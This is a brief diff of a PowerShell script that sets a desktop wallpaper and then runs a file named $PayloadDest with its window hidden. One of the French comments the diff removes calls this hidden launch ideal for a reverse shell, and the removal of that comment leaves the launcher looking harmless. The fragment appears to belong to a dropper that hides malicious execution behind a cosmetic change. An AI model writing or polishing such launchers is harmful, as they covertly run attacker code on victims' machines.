@@ -32,8 +32,4 @@ Try {
     [Wallpaper]::SetDesktopWallpaper($ImageDest)
 } Catch {}
 
-# s'exécute en arrière-plan sans fenêtre visible, ce qui est idéal pour un reverse shell.
 Start-Process -FilePath $PayloadDest -WindowStyle Hidden
-
-
-# Le script se termine ici.
